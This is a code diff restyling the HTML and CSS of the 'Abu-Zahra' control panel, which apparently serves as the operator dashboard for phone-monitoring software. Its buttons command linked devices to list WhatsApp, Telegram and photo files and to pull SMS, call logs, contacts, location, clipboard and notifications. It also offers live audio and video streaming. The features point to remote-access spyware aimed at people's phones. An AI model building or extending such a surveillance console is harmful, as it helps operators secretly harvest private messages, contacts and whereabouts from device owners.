+.login-box button{width:100%;padding:12px;border:none;border-radius:var(--radius-sm);background:var(--accent);color:#fff;font-size:16px;cursor:pointer;transition:background var(--transition);font-weight:600;margin-top:4px}
+.login-box button:hover{background:var(--accent-hover);transform:translateY(-1px)}
+.login-box button:active{transform:translateY(0)}
+.login-error{color:var(--red);font-size:13px;margin-top:10px;display:none}
+
+/* ========== App Layout ========== */
+.app{display:none;min-height:100vh}
+
+/* ========== Sidebar ========== */
+.sidebar{position:fixed;top:0;right:0;width:var(--sidebar-width);height:100vh;background:var(--surface);border-left:1px solid var(--border);padding:0;z-index:100;transition:transform .3s cubic-bezier(.4,0,.2,1);display:flex;flex-direction:column;overflow-y:auto}
+.sidebar .logo{padding:20px 20px 16px;border-bottom:1px solid var(--border);margin-bottom:8px;flex-shrink:0}
+.sidebar .logo h2{color:var(--accent);font-size:18px;font-weight:700;display:flex;align-items:center;gap:8px}
+.sidebar .logo span{color:var(--text-muted);font-size:11px;display:block;margin-top:2px}
+.sidebar nav{flex:1;padding:4px 0}
+.sidebar a{display:flex;align-items:center;padding:10px 20px;color:var(--text-secondary);cursor:pointer;font-size:14px;gap:10px;transition:all var(--transition);border-right:3px solid transparent;position:relative}
+.sidebar a:hover{background:var(--surface2);color:var(--text)}
+.sidebar a.active{background:var(--surface2);color:var(--accent);border-right-color:var(--accent);font-weight:600}
+.sidebar a .nav-badge{margin-right:auto;background:var(--accent);color:#fff;font-size:10px;padding:1px 7px;border-radius:10px;font-weight:700;min-width:18px;text-align:center}
+.sidebar .sidebar-footer{padding:12px 20px;border-top:1px solid var(--border);flex-shrink:0}
+.sidebar-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:99;backdrop-filter:blur(2px)}
+
+/* ========== Hamburger ========== */
+.hamburger{display:none;position:fixed;top:12px;right:12px;z-index:150;background:var(--accent);color:#fff;border:none;width:42px;height:42px;border-radius:var(--radius-sm);font-size:20px;cursor:pointer;box-shadow:var(--shadow);transition:background var(--transition)}
+.hamburger:hover{background:var(--accent-hover)}
+
+/* ========== Main Content ========== */
+.main{margin-right:var(--sidebar-width);padding:24px 28px;min-height:100vh;transition:margin var(--transition)}
+.page{display:none;animation:fadeIn .25s ease}
+.page.active{display:block}
+@keyframes fadeIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:translateY(0)}}
+
+/* ========== Topbar ========== */
+.topbar{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;flex-wrap:wrap;gap:12px}
+.topbar h1{font-size:22px;font-weight:700;display:flex;align-items:center;gap:10px}
+.topbar .time{color:var(--text-secondary);font-size:13px;font-variant-numeric:tabular-nums}
+.live-indicator{display:inline-flex;align-items:center;gap:6px;background:var(--green-bg);color:var(--green);padding:3px 10px;border-radius:12px;font-size:11px;font-weight:600}
+.live-indicator .dot{width:7px;height:7px;border-radius:50%;background:var(--green);animation:livePulse 1.5s infinite}
+.live-indicator.offline{background:var(--red-bg);color:var(--red)}
+.live-indicator.offline .dot{background:var(--red);animation:none}
+.live-indicator.connecting{background:var(--yellow-bg);color:var(--yellow)}
+.live-indicator.connecting .dot{background:var(--yellow);animation:livePulse .8s infinite}
+@keyframes livePulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.8)}}
+
+/* ========== Global Search ========== */
+.global-search{position:relative;flex:1;max-width:360px;min-width:200px}
+.global-search input{width:100%;padding:9px 14px 9px 36px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:13px;outline:none;transition:border var(--transition)}
+.global-search input:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(88,166,255,.15)}
+.global-search .search-icon{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:var(--text-muted);font-size:14px;pointer-events:none}
+
+/* ========== Stats Grid ========== */
+.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:14px;margin-bottom:24px}
+.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:18px 20px;transition:all var(--transition);position:relative;overflow:hidden}
+.stat-card:hover{border-color:var(--border-light);transform:translateY(-1px);box-shadow:var(--shadow)}
+.stat-card .stat-icon{width:40px;height:40px;border-radius:var(--radius-sm);display:flex;align-items:center;justify-content:center;font-size:20px;margin-bottom:10px}
+.stat-card .stat-icon.blue{background:var(--blue-bg);color:var(--blue)}
+.stat-card .stat-icon.green{background:var(--green-bg);color:var(--green)}
+.stat-card .stat-icon.yellow{background:var(--yellow-bg);color:var(--yellow)}
+.stat-card .stat-icon.purple{background:var(--purple-bg);color:var(--purple)}
+.stat-card .stat-icon.red{background:var(--red-bg);color:var(--red)}
+.stat-card .stat-icon.orange{background:rgba(240,136,62,.12);color:var(--orange)}
+.stat-card .label{color:var(--text-secondary);font-size:12px;margin-bottom:4px;text-transform:uppercase;letter-spacing:.5px;font-weight:500}
+.stat-card .value{font-size:26px;font-weight:700;line-height:1.2}
+.stat-card .sub{color:var(--text-muted);font-size:11px;margin-top:4px}
+
+/* ========== Card ========== */
+.card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px;margin-bottom:16px;transition:border var(--transition)}
+.card:hover{border-color:var(--border-light)}
+.card h3{margin-bottom:16px;font-size:15px;font-weight:600;display:flex;align-items:center;gap:8px;color:var(--text)}
+
+/* ========== Filter Bar ========== */
+.filter-bar{display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap;align-items:center}
+.filter-bar select,.filter-bar input{padding:7px 12px;border-radius:var(--radius-xs);border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:12px;outline:none;transition:border var(--transition)}
+.filter-bar select:focus,.filter-bar input:focus{border-color:var(--blue)}
+.filter-bar .filter-label{color:var(--text-muted);font-size:12px;white-space:nowrap}
+
+/* ========== Table ========== */
+.table-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch;border-radius:var(--radius-sm);border:1px solid var(--border)}
+table{width:100%;border-collapse:collapse;min-width:500px}
+th,td{padding:10px 14px;text-align:right;border-bottom:1px solid var(--border);font-size:13px}
+th{color:var(--text-secondary);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.5px;background:var(--surface2);position:sticky;top:0}
+tr:last-child td{border-bottom:none}
+tr:hover td{background:var(--surface2)}
+
+/* ========== Badges ========== */
+.badge{display:inline-flex;align-items:center;padding:2px 9px;border-radius:12px;font-size:11px;font-weight:600;gap:4px;white-space:nowrap}
+.badge-green{background:var(--green-bg);color:var(--green)}
+.badge-red{background:var(--red-bg);color:var(--red)}
+.badge-yellow{background:var(--yellow-bg);color:var(--yellow)}
+.badge-blue{background:var(--blue-bg);color:var(--blue)}
+.badge-purple{background:var(--purple-bg);color:var(--purple)}
+.badge-orange{background:rgba(240,136,62,.12);color:var(--orange)}
+
+/* ========== Buttons ========== */
+.btn{padding:8px 16px;border:none;border-radius:var(--radius-sm);cursor:pointer;font-size:13px;transition:all var(--transition);display:inline-flex;align-items:center;gap:6px;font-weight:500}
+.btn:active{transform:scale(.97)}
+.btn-primary{background:var(--accent);color:#fff}
+.btn-primary:hover{background:var(--accent-hover)}
+.btn-secondary{background:var(--surface2);color:var(--text);border:1px solid var(--border)}
+.btn-secondary:hover{background:var(--surface-hover);border-color:var(--border-light)}
+.btn-sm{padding:5px 11px;font-size:12px}
+.btn-danger{background:var(--red-bg);color:var(--red);border:1px solid rgba(248,81,73,.2)}
+.btn-danger:hover{background:rgba(248,81,73,.2)}
+.btn-ghost{background:transparent;color:var(--text-secondary);padding:4px 8px}
+.btn-ghost:hover{color:var(--text);background:var(--surface2)}
+
+/* ========== Command Grid ========== */
+.cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px}
+.cmd-btn{padding:10px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--surface2);color:var(--text);cursor:pointer;font-size:12px;transition:all var(--transition);text-align:right}
+.cmd-btn:hover{border-color:var(--accent);background:rgba(230,57,70,.08);transform:translateY(-1px)}
+.cmd-btn:active{transform:translateY(0)}
+
+/* ========== Device Cards ========== */
+.device-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:18px;cursor:pointer;transition:all var(--transition);position:relative}
+.device-card:hover{border-color:var(--accent);transform:translateY(-2px);box-shadow:var(--shadow)}
+.device-card .dc-header{display:flex;align-items:center;gap:10px;margin-bottom:10px}
+.device-card .dc-status{width:10px;height:10px;border-radius:50%;flex-shrink:0}
+.device-card .dc-status.online{background:var(--green);box-shadow:0 0 8px rgba(63,185,80,.5);animation:statusGlow 2s infinite}
+.device-card .dc-status.offline{background:var(--text-muted)}
+@keyframes statusGlow{0%,100%{box-shadow:0 0 4px rgba(63,185,80,.3)}50%{box-shadow:0 0 12px rgba(63,185,80,.6)}}
+.device-card .dc-name{font-size:15px;font-weight:600;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.device-card .dc-model{color:var(--text-secondary);font-size:12px;margin-bottom:8px}
+.device-card .dc-meta{display:flex;flex-wrap:wrap;gap:8px;font-size:11px;color:var(--text-muted)}
+.device-card .dc-meta .meta-item{display:flex;align-items:center;gap:4px}
+.device-card .dc-meta .meta-item .meta-icon{font-size:13px}
+.device-cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(290px,1fr));gap:14px}
+
+/* Battery Bar */
+.battery-bar{display:inline-flex;align-items:center;gap:4px}
+.battery-bar .battery-shell{width:22px;height:11px;border:1.5px solid var(--text-muted);border-radius:3px;position:relative;overflow:hidden}
+.battery-bar .battery-shell::after{content:'';position:absolute;right:-4px;top:2px;width:3px;height:5px;background:var(--text-muted);border-radius:0 1px 1px 0}
+.battery-bar .battery-fill{height:100%;border-radius:1px;transition:width .3s}
+.battery-fill.high{background:var(--green)}
+.battery-fill.mid{background:var(--yellow)}
+.battery-fill.low{background:var(--red)}
+.battery-text{font-size:11px;font-weight:600;min-width:28px}
+
+/* Signal Bars */
+.signal-bars{display:inline-flex;align-items:flex-end;gap:1.5px;height:12px}
+.signal-bars .bar{width:3px;border-radius:1px;background:var(--border-light);transition:background .3s}
+.signal-bars .bar.active{background:var(--green)}
+.signal-bars .bar:nth-child(1){height:3px}
+.signal-bars .bar:nth-child(2){height:5px}
+.signal-bars .bar:nth-child(3){height:8px}
+.signal-bars .bar:nth-child(4){height:11px}
+
+/* ========== Command Log ========== */
+.command-log .cmd-item{padding:12px;border:1px solid var(--border);border-radius:var(--radius-sm);margin-bottom:8px;background:var(--bg);transition:all var(--transition)}
+.command-log .cmd-item:hover{border-color:var(--border-light)}
+.command-log .cmd-item .cmd-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;gap:8px}
+.command-log .cmd-item .cmd-cmd{font-family:'Cascadia Code',monospace;font-size:13px;font-weight:500}
+.command-log .cmd-item .cmd-meta{color:var(--text-muted);font-size:11px;display:flex;gap:12px;flex-wrap:wrap}
+.command-log .cmd-item .cmd-result{margin-top:8px;padding:10px;background:var(--surface2);border-radius:var(--radius-xs);font-size:12px;font-family:monospace;color:var(--text-secondary);max-height:200px;overflow-y:auto;word-break:break-all;white-space:pre-wrap;display:none;border:1px solid var(--border)}
+.command-log .cmd-item .cmd-result.expanded{display:block}
+.cmd-item .spinner{display:inline-block;width:12px;height:12px;border:2px solid var(--border);border-top-color:var(--yellow);border-radius:50%;animation:spin .8s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* ========== Event Log ========== */
+.event-log{max-height:600px;overflow-y:auto}
+.event-item{display:grid;grid-template-columns:1fr auto auto auto;gap:8px;padding:10px 12px;border-bottom:1px solid var(--border);font-size:12px;align-items:center;transition:background var(--transition)}
+.event-item:hover{background:var(--surface2)}
+.event-item .ev-time{color:var(--text-muted);font-family:monospace;font-size:11px;white-space:nowrap}
+.event-item .ev-device{color:var(--blue);font-weight:500}
+.event-item .ev-type{padding:2px 8px;border-radius:10px;font-size:10px;font-weight:600;text-transform:uppercase;white-space:nowrap}
+.event-item .ev-type.security{background:var(--red-bg);color:var(--red)}
+.event-item .ev-type.info{background:var(--blue-bg);color:var(--blue)}
+.event-item .ev-type.warning{background:var(--yellow-bg);color:var(--yellow)}
+.event-item .ev-type.success{background:var(--green-bg);color:var(--green)}
+.event-item .ev-details{color:var(--text-secondary);grid-column:1/-1;font-size:11px}
+.auto-scroll-bar{display:flex;align-items:center;gap:8px;margin-bottom:10px}
+.auto-scroll-bar label{font-size:12px;color:var(--text-secondary);display:flex;align-items:center;gap:6px;cursor:pointer}
+.auto-scroll-bar label input{accent-color:var(--accent)}
+
+/* ========== Notification Toast ========== */
+.notification{position:fixed;top:20px;left:20px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-sm);padding:12px 20px;z-index:300;transform:translateX(calc(-100% - 40px));transition:transform .3s cubic-bezier(.4,0,.2,1);font-size:14px;box-shadow:var(--shadow-lg);display:flex;align-items:center;gap:8px}
+.notification.show{transform:translateX(0)}
+
+/* ========== Modal ========== */
+.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:200;align-items:center;justify-content:center;backdrop-filter:blur(4px)}
+.modal-overlay.show{display:flex}
+.modal{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:24px;width:540px;max-width:90vw;max-height:80vh;overflow-y:auto;box-shadow:var(--shadow-lg)}
+
+/* ========== Tabs ========== */
+.tabs{display:flex;gap:4px;margin-bottom:16px;flex-wrap:wrap}
+.tab{padding:7px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);background:transparent;color:var(--text-secondary);cursor:pointer;font-size:12px;transition:all var(--transition);font-weight:500}
+.tab:hover{background:var(--surface2);color:var(--text)}
+.tab.active{background:var(--accent);color:#fff;border-color:var(--accent)}
+
+/* ========== Log Item (legacy) ========== */
+.log-item{padding:8px 0;border-bottom:1px solid var(--border);font-size:12px;display:flex;gap:12px}
+.log-item .time{color:var(--text-muted);white-space:nowrap;font-family:monospace}
+.log-item .event{flex:1}
+
+/* ========== Search Box ========== */
+.search-box{display:flex;gap:8px;margin-bottom:16px}
+.search-box input,.search-box select{flex:1;padding:9px 14px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:13px;outline:none;transition:border var(--transition)}
+.search-box input:focus,.search-box select:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(88,166,255,.12)}
+
+/* ========== Empty State ========== */
+.empty{text-align:center;color:var(--text-muted);padding:40px 20px;font-size:14px}
+.empty .empty-icon{font-size:40px;margin-bottom:10px;opacity:.5}
+
+/* ========== Pulse ========== */
 .pulse{animation:pulse 2s infinite}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
-.empty{text-align:center;color:var(--text2);padding:40px;font-size:14px}
-.tabs{display:flex;gap:4px;margin-bottom:16px;flex-wrap:wrap}
-.tab{padding:8px 16px;border-radius:8px;border:1px solid var(--border);background:transparent;color:var(--text2);cursor:pointer;font-size:13px;transition:all .2s}
-.tab.active{background:var(--accent);color:#fff;border-color:var(--accent)}
-.notification{position:fixed;top:20px;left:20px;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:12px 20px;z-index:300;transform:translateX(-400px);transition:transform .3s;font-size:14px}
-.notification.show{transform:translateX(0)}
-.command-log .cmd-item{padding:10px;border:1px solid var(--border);border-radius:8px;margin-bottom:8px;background:var(--surface2)}
-.command-log .cmd-item .cmd-header{display:flex;justify-content:space-between;margin-bottom:6px}
+
+/* ========== Streaming ========== */
 .stream-layout{display:grid;grid-template-columns:320px 1fr;gap:16px;min-height:500px}
-@media(max-width:900px){.stream-layout{grid-template-columns:1fr;}}
 .stream-controls{display:flex;flex-direction:column;gap:12px}
 .stream-viewer{position:relative;background:#000;border-radius:var(--radius);overflow:hidden;aspect-ratio:16/9;display:flex;align-items:center;justify-content:center}
 .stream-viewer video,.stream-viewer canvas,.stream-viewer img{width:100%;height:100%;object-fit:contain}
-.stream-viewer .no-stream{color:var(--text2);text-align:center;font-size:15px}
-.stream-viewer .stream-badge{position:absolute;top:12px;left:12px;background:rgba(230,57,70,.9);color:#fff;padding:4px 12px;border-radius:20px;font-size:12px;font-weight:600;display:flex;align-items:center;gap:6px}
+.stream-viewer .no-stream{color:var(--text-secondary);text-align:center;font-size:15px}
+.stream-viewer .stream-badge{position:absolute;top:12px;left:12px;background:rgba(230,57,70,.9);color:#fff;padding:4px 12px;border-radius:20px;font-size:12px;font-weight:600;display:flex;align-items:center;gap:6px;backdrop-filter:blur(4px)}
 .stream-viewer .stream-badge.live::before{content:'';width:8px;height:8px;background:#fff;border-radius:50%;animation:pulse 1s infinite}
 .stream-type-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
-.stream-type-btn{padding:14px 8px;border-radius:10px;border:2px solid var(--border);background:var(--surface2);color:var(--text);cursor:pointer;font-size:13px;transition:all .2s;text-align:center}
-.stream-type-btn:hover{border-color:var(--accent)}
-.stream-type-btn.active{border-color:var(--accent);background:rgba(230,57,70,.15)}
+.stream-type-btn{padding:14px 8px;border-radius:10px;border:2px solid var(--border);background:var(--surface2);color:var(--text);cursor:pointer;font-size:13px;transition:all var(--transition);text-align:center}
+.stream-type-btn:hover{border-color:var(--accent);background:rgba(230,57,70,.05)}
+.stream-type-btn.active{border-color:var(--accent);background:rgba(230,57,70,.12)}
 .stream-type-btn .st-icon{font-size:28px;display:block;margin-bottom:4px}
 .stream-actions{display:flex;gap:8px;flex-wrap:wrap}
 .stream-actions .btn{flex:1;min-width:120px;justify-content:center;padding:12px}
-.stream-info{padding:12px;background:var(--surface2);border-radius:8px;font-size:12px;color:var(--text2)}
+.stream-info{padding:12px;background:var(--surface2);border-radius:var(--radius-sm);font-size:12px;color:var(--text-secondary)}
 .stream-info div{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid var(--border)}
 .stream-info div:last-child{border:none}
 .stream-quality{display:flex;gap:6px;flex-wrap:wrap}
-.stream-quality button{padding:6px 14px;border-radius:6px;border:1px solid var(--border);background:transparent;color:var(--text2);cursor:pointer;font-size:12px;transition:all .2s}
+.stream-quality button{padding:6px 14px;border-radius:6px;border:1px solid var(--border);background:transparent;color:var(--text-secondary);cursor:pointer;font-size:12px;transition:all var(--transition)}
 .stream-quality button.active{background:var(--accent);color:#fff;border-color:var(--accent)}
 .audio-bars{display:flex;align-items:center;gap:3px;height:60px;padding:0 20px}
 .audio-bars .bar{width:4px;background:var(--accent);border-radius:2px;transition:height .1s}
+
+/* ========== Relative Time ========== */
+.relative-time{color:var(--text-muted);font-size:11px}
+
+/* ========== Responsive ========== */
+@media(max-width:768px){
+  .sidebar{transform:translateX(100%)}
+  .sidebar.open{transform:translateX(0)}
+  .sidebar-overlay.open{display:block}
+  .main{margin-right:0;padding:16px;padding-top:64px}
+  .hamburger{display:flex;align-items:center;justify-content:center}
+  .stats-grid{grid-template-columns:repeat(2,1fr);gap:10px}
+  .device-cards{grid-template-columns:1fr}
+  .cmd-grid{grid-template-columns:repeat(auto-fill,minmax(150px,1fr))}
+  .event-item{grid-template-columns:1fr;gap:4px}
+  .event-item .ev-details{grid-column:auto}
+  .global-search{max-width:100%;min-width:0}
+  .stream-layout{grid-template-columns:1fr}
+  .topbar h1{font-size:18px}
+  .filter-bar{flex-direction:column;align-items:stretch}
+  .filter-bar select,.filter-bar input{width:100%}
+}
+@media(max-width:480px){
+  .stats-grid{grid-template-columns:1fr 1fr}
+  .stat-card .value{font-size:20px}
+  .stats-grid .stat-card{padding:14px 16px}
+  .device-cards{grid-template-columns:1fr}
+  .cmd-grid{grid-template-columns:1fr 1fr}
+}
+@media(min-width:1400px){
+  .device-cards{grid-template-columns:repeat(auto-fill,minmax(320px,1fr))}
+  .cmd-grid{grid-template-columns:repeat(auto-fill,minmax(220px,1fr))}
+}
 </style>
 </head>
 <body>
+
+<!-- Login Page -->
 <div class="login-page" id="loginPage">
 <div class="login-box">
-<h1>🟥 Abu-Zahra</h1>
+<h1>&#x1F7E5; Abu-Zahra</h1>
 <p>Control Dashboard</p>
 <input type="text" id="loginUser" placeholder="Username" value="admin">
 <input type="password" id="loginPass" placeholder="Password">
@@ -2817,179 +3386,271 @@ th{color:var(--text2);font-weight:500}
 </div>
 </div>
 
-<button class="hamburger" id="hamburger" onclick="toggleSidebar()">☰</button>
+<!-- Hamburger -->
+<button class="hamburger" id="hamburger" onclick="toggleSidebar()">&#9776;</button>
 
+<!-- Sidebar Overlay (mobile) -->
+<div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
+
+<!-- App -->
 <div class="app" id="app">
 <nav class="sidebar" id="sidebar">
-<div class="logo"><h2>🟥 Abu-Zahra</h2><span>Control Panel v3.4</span></div>
-<a class="active" onclick="showPage('dashboard')">📊 Dashboard</a>
-<a onclick="showPage('devices')">📱 Devices</a>
-<a onclick="showPage('commands')">🎮 Commands</a>
-<a onclick="showPage('files')">📂 Files</a>
-<a onclick="showPage('data')">📦 Data</a>
-<a onclick="showPage('streaming')">📡 Live Stream</a>
-<a onclick="showPage('monitor')">🔍 Monitor</a>
-<a onclick="showPage('settings')">⚙️ Settings</a>
-<a onclick="showPage('logs')">📝 Logs</a>
-<a onclick="doLogout()">🚪 Logout</a>
+<div class="logo">
+  <h2>&#x1F7E5; Abu-Zahra</h2>
+  <span>Control Panel v4.0</span>
+</div>
+<nav>
+<a class="active" data-page="dashboard" onclick="showPage('dashboard',this)">&#x1F4CA; Dashboard</a>
+<a data-page="devices" onclick="showPage('devices',this)">&#x1F4F1; Devices</a>
+<a data-page="commands" onclick="showPage('commands',this)">&#x1F3AE; Commands</a>
+<a data-page="files" onclick="showPage('files',this)">&#x1F4C2; Files</a>
+<a data-page="data" onclick="showPage('data',this)">&#x1F4E6; Data</a>
+<a data-page="streaming" onclick="showPage('streaming',this)">&#x1F4E1; Live Stream</a>
+<a data-page="monitor" onclick="showPage('monitor',this)">&#x1F50D; Monitor</a>
+<a data-page="events" onclick="showPage('events',this)">&#x1F4CB; Events</a>
+<a data-page="settings" onclick="showPage('settings',this)">&#x2699;&#xFE0F; Settings</a>
 </nav>
+<div class="sidebar-footer">
+<a onclick="doLogout()" style="color:var(--red)">&#x1F6AA; Logout</a>
+</div>
+</nav>
+
 <div class="main">
 
+<!-- ====== Dashboard Page ====== -->
 <div class="page active" id="page-dashboard">
-<div class="topbar"><h1>📊 Dashboard</h1><span class="time" id="clock"></span></div>
+<div class="topbar">
+  <h1>&#x1F4CA; Dashboard</h1>
+  <div style="display:flex;align-items:center;gap:12px">
+    <div class="live-indicator" id="wsIndicator">
+      <span class="dot"></span>
+      <span id="wsStatusText">Connecting</span>
+    </div>
+    <span class="time" id="clock"></span>
+  </div>
+</div>
 <div class="stats-grid" id="statsGrid"></div>
-<div class="card"><h3>📱 Active Devices</h3><div id="dashDevices" class="device-cards"></div></div>
-<div class="card"><h3>📋 Recent Commands</h3><div id="dashCommands"></div></div>
+<div class="card"><h3>&#x1F4F1; Active Devices</h3><div id="dashDevices" class="device-cards"></div></div>
+<div class="card"><h3>&#x1F4CB; Recent Commands</h3><div id="dashCommands" class="command-log"></div></div>
 </div>
 
+<!-- ====== Devices Page ====== -->
 <div class="page" id="page-devices">
-<div class="topbar"><h1>📱 Devices</h1><button class="btn btn-primary" onclick="generateLink()">🔗 Link Device</button></div>
-<div id="linkCodeBox" style="display:none" class="card"><h3>🔗 Link Code</h3><p id="linkCodeText" style="font-size:24px;font-weight:bold;text-align:center;color:var(--accent)"></p></div>
+<div class="topbar">
+  <h1>&#x1F4F1; Devices</h1>
+  <button class="btn btn-primary" onclick="generateLink()">&#x1F517; Link Device</button>
+</div>
+<div class="global-search" style="max-width:100%;margin-bottom:16px">
+  <span class="search-icon">&#x1F50D;</span>
+  <input type="text" id="deviceSearch" placeholder="Search devices by name, model..." oninput="filterDevices()">
+</div>
+<div id="linkCodeBox" style="display:none" class="card">
+  <h3>&#x1F517; Link Code</h3>
+  <p id="linkCodeText" style="font-size:28px;font-weight:bold;text-align:center;color:var(--accent);letter-spacing:4px"></p>
+</div>
+<div class="filter-bar" id="deviceFilters">
+  <span class="filter-label">Status:</span>
+  <select id="deviceStatusFilter" onchange="filterDevices()">
+    <option value="all">All</option>
+    <option value="online">Online</option>
+    <option value="offline">Offline</option>
+  </select>
+</div>
 <div class="device-cards" id="deviceList"></div>
 <div class="card" id="deviceDetail" style="display:none"></div>
 </div>
 
+<!-- ====== Commands Page ====== -->
 <div class="page" id="page-commands">
-<div class="topbar"><h1>🎮 Command Center</h1></div>
+<div class="topbar"><h1>&#x1F3AE; Command Center</h1></div>
 <div class="card"><h3>Send Command</h3>
-<div class="search-box"><select id="cmdDevice" style="flex:1;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text)"></select></div>
-<div class="tabs" id="cmdTabs"></div>
-<div class="cmd-grid" id="cmdGrid"></div>
+  <div class="search-box"><select id="cmdDevice" style="flex:1"></select></div>
+  <div class="tabs" id="cmdTabs"></div>
+  <div class="cmd-grid" id="cmdGrid"></div>
 </div>
-<div class="card"><h3>Command Log</h3><div id="cmdLog" class="command-log"></div></div>
+<div class="card">
+  <h3>&#x1F4CB; Command Log</h3>
+  <div class="filter-bar">
+    <span class="filter-label">Filter:</span>
+    <select id="cmdStatusFilter" onchange="filterCommandLog()">
+      <option value="all">All Status</option>
+      <option value="pending">Pending</option>
+      <option value="completed">Completed</option>
+      <option value="failed">Failed</option>
+    </select>
+    <input type="text" id="cmdSearchInput" placeholder="Search commands..." oninput="filterCommandLog()" style="max-width:200px">
+  </div>
+  <div id="cmdLog" class="command-log"></div>
+</div>
 </div>
 
+<!-- ====== Files Page ====== -->
 <div class="page" id="page-files">
-<div class="topbar"><h1>📂 File Browser</h1></div>
+<div class="topbar"><h1>&#x1F4C2; File Browser</h1></div>
 <div class="card"><h3>Select device to browse files</h3>
-<select id="fileDevice" style="width:100%;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text)"></select>
+<select id="fileDevice" style="width:100%;padding:10px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--bg);color:var(--text)"></select>
 <div class="cmd-grid" style="margin-top:12px">
-<button class="cmd-btn" onclick="sendCmd('list_downloads')">📥 Downloads</button>
-<button class="cmd-btn" onclick="sendCmd('list_dcim')">📸 DCIM</button>
-<button class="cmd-btn" onclick="sendCmd('list_music')">🎵 Music</button>
-<button class="cmd-btn" onclick="sendCmd('list_videos')">🎬 Videos</button>
-<button class="cmd-btn" onclick="sendCmd('list_documents')">📁 Documents</button>
-<button class="cmd-btn" onclick="sendCmd('list_whatsapp')">💬 WhatsApp</button>
-<button class="cmd-btn" onclick="sendCmd('list_telegram_files')">✈️ Telegram</button>
-<button class="cmd-btn" onclick="sendCmd('recent_files')">🕐 Recent</button>
+  <button class="cmd-btn" onclick="sendCmd('list_downloads')">&#x1F4E5; Downloads</button>
+  <button class="cmd-btn" onclick="sendCmd('list_dcim')">&#x1F4F8; DCIM</button>
+  <button class="cmd-btn" onclick="sendCmd('list_music')">&#x1F3B5; Music</button>
+  <button class="cmd-btn" onclick="sendCmd('list_videos')">&#x1F3AC; Videos</button>
+  <button class="cmd-btn" onclick="sendCmd('list_documents')">&#x1F4C1; Documents</button>
+  <button class="cmd-btn" onclick="sendCmd('list_whatsapp')">&#x1F4AC; WhatsApp</button>
+  <button class="cmd-btn" onclick="sendCmd('list_telegram_files')">&#x2708;&#xFE0F; Telegram</button>
+  <button class="cmd-btn" onclick="sendCmd('recent_files')">&#x1F550; Recent</button>
 </div></div>
 </div>
 
+<!-- ====== Data Page ====== -->
 <div class="page" id="page-data">
-<div class="topbar"><h1>📦 Data Viewer</h1></div>
+<div class="topbar"><h1>&#x1F4E6; Data Viewer</h1></div>
 <div class="card"><h3>Quick Data</h3>
-<select id="dataDevice" style="width:100%;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-bottom:12px"></select>
+<select id="dataDevice" style="width:100%;padding:10px;border-radius:var(--radius-sm);border:1px solid var(--border);background:var(--bg);color:var(--text);margin-bottom:12px"></select>
 <div class="cmd-grid">
-<button class="cmd-btn" onclick="sendDataCmd('sms')">📲 SMS</button>
-<button class="cmd-btn" onclick="sendDataCmd('calls')">📞 Calls</button>
-<button class="cmd-btn" onclick="sendDataCmd('contacts')">📇 Contacts</button>
-<button class="cmd-btn" onclick="sendDataCmd('location')">📍 Location</button>
-<button class="cmd-btn" onclick="sendDataCmd('notifications')">🔔 Notifications</button>
-<button class="cmd-btn" onclick="sendDataCmd('clipboard')">📋 Clipboard</button>
-<button class="cmd-btn" onclick="sendDataCmd('battery')">🔋 Battery</button>
-<button class="cmd-btn" onclick="sendDataCmd('info')">ℹ️ Device Info</button>
+  <button class="cmd-btn" onclick="sendDataCmd('sms')">&#x1F4F2; SMS</button>
+  <button class="cmd-btn" onclick="sendDataCmd('calls')">&#x1F4DE; Calls</button>
+  <button class="cmd-btn" onclick="sendDataCmd('contacts')">&#x1F4C7; Contacts</button>
+  <button class="cmd-btn" onclick="sendDataCmd('location')">&#x1F4CD; Location</button>
+  <button class="cmd-btn" onclick="sendDataCmd('notifications')">&#x1F514; Notifications</button>
+  <button class="cmd-btn" onclick="sendDataCmd('clipboard')">&#x1F4CB; Clipboard</button>
+  <button class="cmd-btn" onclick="sendDataCmd('battery')">&#x1F50B; Battery</button>
+  <button class="cmd-btn" onclick="sendDataCmd('info')">&#x2139;&#xFE0F; Device Info</button>
 </div></div>
 </div>
 
+<!-- ====== Monitor Page ====== -->
 <div class="page" id="page-monitor">
-<div class="topbar"><h1>🔍 Monitoring</h1></div>
+<div class="topbar"><h1>&#x1F50D; Monitoring</h1></div>
